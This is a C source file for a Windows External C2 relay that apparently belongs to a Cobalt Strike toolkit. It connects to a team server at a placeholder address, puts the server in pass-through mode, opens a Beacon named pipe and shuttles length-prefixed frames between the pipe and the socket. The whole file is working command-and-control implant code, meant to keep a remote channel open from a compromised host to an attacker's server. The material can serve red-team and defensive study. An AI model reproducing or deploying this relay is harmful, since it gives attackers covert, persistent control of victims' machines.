#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#include "Extc2.h"
#include "Debug.h"
#include "Utils.h"

/*
* Initialize the External C2 Server
*/
SOCKET InitExternalC2() {
    // Initiate use of Winsock DLL
    WSADATA wsaData;
    WORD    wVersionRequested;
    wVersionRequested = MAKEWORD(2, 2);
    if (WSAStartup(wVersionRequested, &wsaData) != 0) {
        DLOGF("EXTC2: Failed to initialize Winsock DLL. Exiting...\n");
        return SOCKET_ERROR;
    }

    struct sockaddr_in 	sock;
    sock.sin_family = AF_INET;

    /**
    * This IP is a placeholder that is replaced by the extc2-loader's Aggressor Script.
    * Please note, the IP and Port should be manually updated when debugging the External C2
    * DLL independently.
    */
    inet_pton(AF_INET, "999.999.999.999", &sock.sin_addr.s_addr);
    sock.sin_port = htons(2222);

    // Connect to team server
    SOCKET extC2ServerSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(extC2ServerSocket, (struct sockaddr*)&sock, sizeof(sock)) == SOCKET_ERROR) {
        DLOGF("EXTC2: Could not connect to External C2 Server. Exiting...\n");
        return SOCKET_ERROR;
    }

    // Instruct the team server to use "pass thru" mode.
    if (!SendFrameToExtC2Server(extC2ServerSocket, "payload=false", 13)) {
        DLOGF("EXTC2: Failed to send 'payload' option to External C2 Server. Exiting...\n");
        return SOCKET_ERROR;
    }

    // Start the session
    if (!SendFrameToExtC2Server(extC2ServerSocket, "go", 2)) {
        DLOGF("EXTC2: Failed to send 'go' option to External C2 Server. Exiting...\n");
        return SOCKET_ERROR;
    }

    return extC2ServerSocket;
}

/*
* Connect to the Beacon pipe
* 
* Note: This function returns NULL if DEBUG_EXTERNAL_C2_ONLY
* is enabled.
*
* @return A handle to the Beacon pipe
*/
HANDLE ConnectToBeaconPipe() {
#if defined(_DEBUG) && DEBUG_EXTERNAL_C2_ONLY 
    return NULL;
#else
    HANDLE beaconPipeHandle = INVALID_HANDLE_VALUE;
    int timer = 0;

    while (beaconPipeHandle == INVALID_HANDLE_VALUE) {
        // Stop the pipe running forever
        if (timer == 30) {
            return INVALID_HANDLE_VALUE;
        }

        Sleep(1000);

        /**
        * This pipe name is a placeholder that is replaced by the extc2-loader's Aggressor Script.
        * Please note, it should be manually updated when debugging the External C2 DLL independently.
        */
        beaconPipeHandle = CreateFileA("\\\\.\\pipe\\EXTC2_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE", GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);

        // Increment the timer
        timer++;
    }

    return beaconPipeHandle;
#endif
}

/*
* Read a frame from the Beacon pipe
*
* Note: This function uses PeekNamedPipe() to check the pipe for data.
* If no data is available, it will return NO_DATA_AVAILABLE.
*
* @param pipeHandle A handle to the Beacon pipe
* @param buffer The buffer that will hold the data
* @return The length of the received frame
*/
int ReadFrameFromBeaconPipe(HANDLE pipeHandle, char* buffer) {
#if defined(_DEBUG) && DEBUG_EXTERNAL_C2_ONLY
    return NO_DATA_AVAILABLE;
#else
    DWORD size = 0, temp = 0, total = 0;
    DWORD totalBytesAvailable = 0;

    // Check if there's data on the pipe
    if (!PeekNamedPipe(pipeHandle, NULL, 0, NULL, &totalBytesAvailable, NULL)) {
        return EXTC2PIPE_READ_ERROR;
    }
    if (totalBytesAvailable == 0) {
        // If no data is available, return to avoid waiting
        return NO_DATA_AVAILABLE;
    }

    // Read the length of the buffer
    if (!ReadFile(pipeHandle, (char*)&size, 4, &temp, NULL)) {
        return EXTC2PIPE_READ_ERROR;
    }

    // Read the buffer
    while (total < size) {
        if (!ReadFile(pipeHandle, buffer + total, size - total, &temp, NULL)) {
            return EXTC2PIPE_READ_ERROR;
        }
        total += temp;
    }

    return size;
#endif
}

/**
* Write a frame to the Beacon pipe
*
* @param pipeHandle A handle to the Beacon pipe
* @param buffer The buffer that holds the data
* @param length The length of the frame
* @return A Boolean value to indicate success
*/
BOOL WriteFrameToBeaconPipe(HANDLE pipeHandle, const char* buffer, DWORD length) {
#if defined(_DEBUG) && DEBUG_EXTERNAL_C2_ONLY
    return TRUE;
#else
    DWORD wrote = 0;
    // Write the length of the buffer
    if (!WriteFile(pipeHandle, (void*)&length, 4, &wrote, NULL)) {
        return FALSE;
    }

    // Write the buffer
    if (!WriteFile(pipeHandle, buffer, length, &wrote, NULL)) {
        return FALSE;
    }
    return TRUE;
#endif
}

/**
* Receive a frame from the External C2 server via a socket
*
* Note: This function uses ioctlsocket() to check the socket for data.
* If no data is available, it will return NO_DATA_AVAILABLE.
*
* @param socket The socket to receive the data
* @param buffer The buffer that will hold the data
* @return The length of the received frame
*/
int ReceiveFrameFromExtC2Server(SOCKET socket, char* buffer) {
    DWORD size = 0, total = 0, receivedBytes = 0;
    unsigned long dataAvailable = 0;

    // Check if there's data on the socket
    if (ioctlsocket(socket, FIONREAD, &dataAvailable) == SOCKET_ERROR) {
        return EXTC2SOCKET_READ_ERROR;
    }

    if (dataAvailable == 0) {
        // If no data is available, return to avoid waiting
        return NO_DATA_AVAILABLE;
    }
    // Read the length of the buffer (4 bytes)
    if (recv(socket, (char*)&size, 4, 0) <= 0) {
        return EXTC2SOCKET_READ_ERROR;
    }

    // Read the buffer
    while (total < size) {
        receivedBytes = recv(socket, buffer + total, size - total, 0);
        if (receivedBytes <= 0) {
            return EXTC2SOCKET_READ_ERROR;
        }
        total += receivedBytes;
    }

    return size;
}

/**
* Send a frame to the External C2 server via a socket
*
* @param socket The socket to send data
* @param buffer The buffer that holds the data
* @param length The length of the frame
* @return A Boolean value to indicate success
*/
BOOL SendFrameToExtC2Server(SOCKET socket, const char* buffer, int length) {
    // Send the length of the buffer
    if (send(socket, (char*)&length, 4, 0) == SOCKET_ERROR) {
        return FALSE;
    }
    // Send the buffer
    if (send(socket, buffer, length, 0) == SOCKET_ERROR) {
        return FALSE;
    }
    return TRUE;
}
